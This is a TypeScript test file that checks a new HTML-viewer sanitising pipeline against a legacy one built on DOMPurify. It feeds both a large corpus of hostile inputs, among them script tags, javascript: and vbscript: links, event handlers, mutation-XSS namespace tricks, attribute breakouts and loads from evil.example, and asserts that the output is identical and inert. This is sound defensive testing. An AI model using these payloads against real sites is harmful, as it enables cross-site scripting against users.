// @vitest-environment jsdom
/**
 * Security equivalence of the HTML viewer's sanitising pipeline.
 *
 * The viewer renders untrusted web content inside the app's own webview, so
 * the pipeline that lifts large inlined images out before DOMPurify runs must
 * let through exactly what the old one did — nothing more. That is checked
 * here mechanically: every hostile input goes through both, and the results
 * must be byte-identical, as strings and as mounted DOM.
 */
import { describe, it, expect, vi, afterEach } from "vitest";
import DOMPurify from "dompurify";
import { prepareHtmlBody, mountPreparedHtml } from "@/lib/html-viewer-sanitise";
import {
  legacySanitisedBody,
  expandForComparison,
  base64Payload,
  buildCapture,
} from "./html-legacy-sanitise-reference";

const P = base64Payload(4096, 7);
const BIG_PNG = `data:image/png;base64,${P}`;
const BIG_JPEG = `data:image/jpeg;base64,${base64Payload(6000, 8)}`;
const BIG_SVG = `data:image/svg+xml;base64,${P}`;
const BIG_HTML = `data:text/html;base64,${P}`;
/** What a stand-in looks like, with a token no lift will ever issue. */
const LOOKALIKE = "data:image/png;base64,NSLIFT00000000000000000000000000000000Z0";

interface Case {
  name: string;
  html: string;
  /** How many values the new pipeline is expected to lift (default: don't care). */
  lifts?: number;
}

const CORPUS: Case[] = [
  // ── Plain script execution vectors, next to a lifted image ────────────────
  { name: "script tag", html: `<p>a</p><script>alert(1)</script><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "script with src", html: `<script src="https://evil.example/x.js"></script><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "event handler on the lifted image", html: `<img src="${BIG_PNG}" onerror="alert(1)" onload="alert(2)">`, lifts: 1 },
  { name: "event handler elsewhere", html: `<div onclick="alert(1)" onmouseover="x()"><img src="${BIG_PNG}"></div>`, lifts: 1 },
  { name: "javascript: href", html: `<a href="javascript:alert(1)"><img src="${BIG_PNG}"></a>`, lifts: 1 },
  { name: "javascript: with entity and whitespace obfuscation", html: `<a href="jav&#x09;ascript:alert(1)">a</a><a href=" JaVaScRiPt:alert(1)">b</a><a href="java\nscript:alert(1)">c</a><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "vbscript and data hrefs", html: `<a href="vbscript:msgbox(1)">a</a><a href="data:text/html,<script>alert(1)</script>">b</a>` },
  { name: "iframe, object, embed", html: `<iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x.swf"><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "iframe srcdoc", html: `<iframe srcdoc="<script>alert(1)</script>"></iframe>` },
  { name: "form with javascript action", html: `<form action="javascript:alert(1)"><button formaction="javascript:alert(2)">go</button></form>` },
  { name: "meta refresh and base", html: `<meta http-equiv="refresh" content="0;url=javascript:alert(1)"><base href="https://evil.example/"><img src="${BIG_PNG}">` },
  { name: "style element in the body", html: `<style>body{background:url(javascript:alert(1))} *{display:none}</style><p>x</p><img src="${BIG_PNG}">` },
  { name: "link stylesheet", html: `<link rel="stylesheet" href="https://evil.example/x.css"><p>x</p>` },

  // ── data: URIs that must NOT be lifted, in every attribute that takes one ─
  { name: "data:text/html in img src", html: `<img src="${BIG_HTML}">`, lifts: 0 },
  { name: "data:text/html in a href", html: `<a href="${BIG_HTML}">x</a>`, lifts: 0 },
  { name: "data:image/svg+xml in img src", html: `<img src="${BIG_SVG}">`, lifts: 0 },
  { name: "data:image/svg+xml in a href", html: `<a href="${BIG_SVG}">x</a>`, lifts: 0 },
  { name: "svg and html data URIs in srcset", html: `<img srcset="${BIG_SVG} 1x, ${BIG_HTML} 2x">`, lifts: 0 },
  { name: "svg and html data URIs in style", html: `<div style="background:url(${BIG_SVG})">a</div><div style="background:url('${BIG_HTML}')">b</div>`, lifts: 0 },
  { name: "raster data URI in srcset and style (never lifted)", html: `<img srcset="${BIG_PNG} 2x"><div style="background-image:url(${BIG_PNG})">x</div>`, lifts: 0 },
  { name: "unencoded svg data URI with script", html: `<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>">`, lifts: 0 },

  // ── Obfuscated schemes ────────────────────────────────────────────────────
  { name: "uppercase data scheme", html: `<img src="DATA:IMAGE/PNG;BASE64,${P}"><img src="Data:image/png;base64,${P}">`, lifts: 0 },
  { name: "whitespace before and inside the scheme", html: `<img src=" ${BIG_PNG}"><img src="da&#x09;ta:image/png;base64,${P}"><img src="&#x0a;${BIG_PNG}">`, lifts: 0 },
  { name: "uppercase text/html data scheme", html: `<a href="DATA:TEXT/HTML;base64,${P}">x</a><img src="dAtA:tExT/hTmL;base64,${P}">`, lifts: 0 },

  // ── Oversized payloads that are not clean base64 ──────────────────────────
  { name: "payload with a quote breakout", html: `<img src="data:image/png;base64,${P}&quot; onerror=&quot;alert(1)">`, lifts: 0 },
  { name: "payload with a tag breakout", html: `<img src="data:image/png;base64,${P}&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">`, lifts: 0 },
  { name: "payload with a raw tag breakout (single-quoted attribute)", html: `<img src='data:image/png;base64,${P}"><img src=x onerror=alert(1)>'>`, lifts: 0 },
  { name: "payload closing a style/title/textarea", html: `<img src="data:image/png;base64,${P}</style><script>alert(1)</script>"><img src="data:image/png;base64,${P}</textarea>">`, lifts: 0 },
  { name: "payload with a comment terminator", html: `<img src="data:image/png;base64,${P}--><script>alert(1)</script>">`, lifts: 0 },
  { name: "payload with characters outside the alphabet", html: `<img src="data:image/png;base64,${P} ${P}"><img src="data:image/png;base64,${P}%3Cscript%3E"><img src="data:image/png;base64,${P}-_">`, lifts: 0 },
  { name: "unquoted payload followed by a handler", html: `<img src=${BIG_PNG} onerror=alert(1)>`, lifts: 1 },

  // ── Forged stand-ins ──────────────────────────────────────────────────────
  { name: "stand-in lookalike in text", html: `<p>${LOOKALIKE}</p><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "stand-in lookalike in attributes", html: `<img src="${LOOKALIKE}"><a href="${LOOKALIKE}" title="${LOOKALIKE}">x</a><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "stand-in lookalike in style and srcset", html: `<div style="background:url(${LOOKALIKE})">x</div><img srcset="${LOOKALIKE} 1x"><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "stand-in lookalike in a comment and a textarea", html: `<!-- ${LOOKALIKE} --><textarea>${LOOKALIKE}</textarea><img src="${BIG_PNG}">`, lifts: 1 },

  // ── Lifted values in places DOMPurify rejects data: URIs ──────────────────
  { name: "raster data URI in a href (not a data-URI tag)", html: `<a href="${BIG_PNG}">x</a>`, lifts: 1 },
  { name: "raster data URI in video poster", html: `<video poster="${BIG_PNG}" controls></video>`, lifts: 1 },
  { name: "raster data URI on forbidden elements", html: `<iframe src="${BIG_PNG}"></iframe><embed src="${BIG_PNG}"><script src="${BIG_PNG}"></script><p>after</p>`, lifts: 3 },
  { name: "raster data URI in svg image href and xlink:href", html: `<svg><image href="${BIG_PNG}"/><image xlink:href="${BIG_JPEG}"/><a xlink:href="${BIG_PNG}"><text>t</text></a></svg>`, lifts: 3 },
  { name: "raster data URI on source, audio, track, input", html: `<picture><source src="${BIG_PNG}"><img src="${BIG_JPEG}"></picture><audio src="${BIG_PNG}"></audio><input type="image" src="${BIG_PNG}">`, lifts: 4 },
  { name: "raster data URI on an unknown element and a custom element", html: `<blink src="${BIG_PNG}">x</blink><x-img src="${BIG_PNG}" href="${BIG_PNG}">y</x-img>`, lifts: 3 },
  { name: "the same image many times", html: `<img src="${BIG_PNG}"><img src="${BIG_PNG}"><img src="${BIG_PNG}" onerror="x">`, lifts: 3 },

  // ── mXSS classics ─────────────────────────────────────────────────────────
  { name: "math/mtext/table/mglyph/style namespace confusion", html: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;"><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "svg/style namespace confusion", html: `<svg><style><img src="${BIG_PNG}" onerror="alert(1)"></style></svg><svg></p><style><a id="</style><img src=1 onerror=alert(1)>">` },
  { name: "nested svg in math with annotation-xml", html: `<math><annotation-xml encoding="text/html"><svg><foreignObject><img src="${BIG_PNG}" onerror=alert(1)></foreignObject></svg></annotation-xml></math>` },
  { name: "form/math/mtext/form/mglyph", html: `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)><img src="${BIG_PNG}">` },
  { name: "svg foreignObject and desc breakout", html: `<svg><desc><img src="${BIG_PNG}" onerror=alert(1)></desc><foreignObject><p onclick=x><img src="${BIG_PNG}"></p></foreignObject><title><script>alert(1)</script></title></svg>` },
  { name: "noscript with a closing tag in an attribute", html: `<noscript><p title="</noscript><img src=x onerror=alert(1)>"><img src="${BIG_PNG}"></noscript><img src="${BIG_PNG}">` },
  { name: "noscript holding a lifted image", html: `<noscript><img src="${BIG_PNG}"></noscript><p>after</p>` },
  { name: "template holding scripts and images", html: `<template><script>alert(1)</script><img src="${BIG_PNG}" onerror="alert(1)"><a href="javascript:alert(1)">x</a></template><img src="${BIG_JPEG}">`, lifts: 1 },
  { name: "nested templates", html: `<template><template><img src="${BIG_PNG}" onload=x></template></template><p>after</p>`, lifts: 0 },
  { name: "textarea, title, xmp and plaintext raw text", html: `<textarea><img src="${BIG_PNG}" onerror=alert(1)></textarea><xmp><script>alert(1)</script></xmp><img src="${BIG_PNG}"><plaintext><img src="${BIG_PNG}" onerror=alert(1)>`, lifts: 1 },
  { name: "comment tricks", html: `<!--><img src="${BIG_PNG}" onerror=alert(1)>--><!----!><script>alert(1)</script>--><img src="${BIG_PNG}">` },
  { name: "select/option/table foster parenting", html: `<table><tr><td><img src="${BIG_PNG}"></td></tr><img src="${BIG_JPEG}" onerror=x><script>alert(1)</script></table><select><option><img src="${BIG_PNG}"></select>` },
  { name: "nested forms and anchors", html: `<a href="x"><a href="javascript:alert(1)"><img src="${BIG_PNG}"></a></a><form><form><input name="attributes"><img src="${BIG_PNG}" name="innerHTML"></form></form>` },
  { name: "DOM clobbering names next to a lifted image", html: `<img name="body" src="${BIG_PNG}"><img id="cookie" src="${BIG_PNG}"><form id="document"><input name="createElement"></form>` },
  { name: "is attribute and customized built-ins", html: `<p is="x-foo">kept?</p><img is="x-img" src="${BIG_PNG}">` },
  { name: "svg animate/set/use href games", html: `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="xlink:href" to="javascript:alert(1)"/><text>x</text></a><use href="${BIG_PNG}"/><use xlink:href="data:image/svg+xml;base64,${P}#x"/></svg>` },
  { name: "pre with a leading newline and false </body>", html: `<pre>\n\nline</pre><pre></body></pre><img src="${BIG_PNG}"><!-- </body> --><p>tail</p>` },
  { name: "data-* attributes and aria", html: `<img data-src="${BIG_PNG}" data-x="1" aria-label="pic" src="${BIG_PNG}">`, lifts: 1 },

  // ── Whole-document shapes ─────────────────────────────────────────────────
  { name: "full document with head styles and scripts", html: `<!doctype html><html><head><style>*{color:red}</style><script>alert(1)</script></head><body onload="alert(1)"><h1>T</h1><img src="${BIG_PNG}"></body></html>`, lifts: 1 },
  { name: "head only: body empty, raw-text fallback", html: `<html><head><script>alert(1)</script><style>p{}</style></head></html>`, lifts: 0 },
  { name: "script only", html: `<script>alert(1)</script>`, lifts: 0 },
  { name: "plain text with an ampersand", html: `plain & simple`, lifts: 0 },
  { name: "leading whitespace before content", html: `\n\n  <p>x</p><img src="${BIG_PNG}">`, lifts: 1 },
  { name: "external resources beside a lifted image", html: `<img src="https://evil.example/pixel.gif"><img src="${BIG_PNG}" srcset="https://evil.example/a.png 1x"><div style="background:url(https://evil.example/b.png)">x</div><a href="https://example.com" ping="https://evil.example/p">l</a><video poster="https://evil.example/p.jpg"></video>`, lifts: 1 },
];

function mount(apply: (host: HTMLElement) => void): string {
  const host = document.createElement("div");
  apply(host);
  return host.innerHTML;
}

function assertInert(host: HTMLElement): void {
  expect(host.querySelector("script, iframe, object, embed")).toBeNull();
  const elements: Element[] = [];
  const collect = (root: ParentNode) => {
    for (const el of Array.from(root.querySelectorAll("*"))) {
      elements.push(el);
      if (el.localName === "template") collect((el as HTMLTemplateElement).content);
    }
  };
  collect(host);
  for (const el of elements) {
    for (const attr of Array.from(el.attributes)) {
      expect(attr.name.toLowerCase().startsWith("on"), `${attr.name} on <${el.localName}>`).toBe(false);
      const compact = attr.value.replace(/[\u0000-  ]/g, "").toLowerCase();
      expect(compact.startsWith("javascript:"), `${attr.name}=${attr.value.slice(0, 40)}`).toBe(false);
      expect(compact.startsWith("vbscript:"), `${attr.name}=${attr.value.slice(0, 40)}`).toBe(false);
    }
  }
}

afterEach(() => {
  vi.restoreAllMocks();
});

describe.each([false, true])("sanitising pipeline equivalence (blockExternal=%s)", (blockExternal) => {
  it.each(CORPUS)("$name", ({ html, lifts }) => {
    const expected = legacySanitisedBody(html, blockExternal);
    const prepared = prepareHtmlBody(html, blockExternal);

    if (lifts !== undefined) expect(prepared.lifted.originals.size).toBe(lifts);

    // 1. The sanitiser's own output, stand-ins expanded, is byte-identical.
    expect(expandForComparison(prepared)).toBe(expected);

    // 2. So is the tree the reader actually gets.
    const host = document.createElement("div");
    mountPreparedHtml(host, prepared);
    expect(host.innerHTML).toBe(mount((h) => (h.innerHTML = expected)));

    // 3. And nothing executable is in it, whatever the reference says.
    assertInert(host);
    // No stand-in is ever left behind in a mounted tree.
    for (const standIn of prepared.lifted.originals.keys()) {
      expect(host.innerHTML).not.toContain(standIn);
    }
  });
});

describe("prepareHtmlBody", () => {
  it("uses the viewer's DOMPurify configuration, unchanged", () => {
    const spy = vi.spyOn(DOMPurify, "sanitize");
    prepareHtmlBody(`<p>x</p><img src="${BIG_PNG}">`, false);
    expect(spy).toHaveBeenCalledTimes(1);
    expect(spy.mock.calls[0][1]).toEqual({
      ALLOW_DATA_ATTR: false,
      FORBID_TAGS: ["script", "iframe", "object", "embed"],
    });
  });

  it("keeps a surviving lifted image out of the sanitised string and restores it exactly on mount", () => {
    const prepared = prepareHtmlBody(`<p>x</p><img src="${BIG_PNG}" alt="a"><img src="${BIG_JPEG}">`, false);
    expect(prepared.html).not.toContain(P);
    expect(prepared.html.length).toBeLessThan(400);

    const host = document.createElement("div");
    mountPreparedHtml(host, prepared);
    const imgs = host.querySelectorAll("img");
    expect(imgs[0].getAttribute("src")).toBe(BIG_PNG);
    expect(imgs[1].getAttribute("src")).toBe(BIG_JPEG);
    expect(imgs[0].hasAttribute("decoding")).toBe(false);
  });

  it("marks restored images decoding=async when asked, and leaves the others alone", () => {
    const small = "data:image/png;base64,iVBORw0KGgo=";
    const prepared = prepareHtmlBody(
      `<img id="big" src="${BIG_PNG}"><img id="small" src="${small}"><img id="own" decoding="sync" src="${BIG_JPEG}">`,
      false,
    );
    const host = document.createElement("div");
    mountPreparedHtml(host, prepared, true);
    const imgs = host.querySelectorAll("img");
    expect(imgs[0].getAttribute("decoding")).toBe("async");
    expect(imgs[0].hasAttribute("loading")).toBe(false);
    expect(imgs[1].hasAttribute("decoding")).toBe(false);
    expect(imgs[2].getAttribute("decoding")).toBe("sync");
  });

  it("a benign 3 MB capture renders the same tree as before, images intact, from a small sanitiser input", () => {
    const capture = buildCapture(3_000_000, 6);
    expect(capture.html.length).toBeGreaterThan(2_900_000);

    const expected = legacySanitisedBody(capture.html, false);

    const sanitize = vi.spyOn(DOMPurify, "sanitize");
    const prepared = prepareHtmlBody(capture.html, false);

    // The string DOMPurify is asked to process is a few percent of the file.
    expect(sanitize).toHaveBeenCalledTimes(1);
    const given = sanitize.mock.calls[0][0] as string;
    expect(given.length).toBeLessThan(40_000);
    expect(prepared.sanitisedChars).toBe(given.length);
    expect(prepared.html.length).toBeLessThan(40_000);
    expect(prepared.lifted.originals.size).toBe(6);

    const host = document.createElement("div");
    mountPreparedHtml(host, prepared);
    const reference = document.createElement("div");
    reference.innerHTML = expected;

    expect(host.isEqualNode(reference)).toBe(true);
    expect(host.innerHTML).toBe(reference.innerHTML);
    const imgs = Array.from(host.querySelectorAll("img"));
    expect(imgs.map((img) => img.getAttribute("src"))).toEqual(capture.images);
  });
});
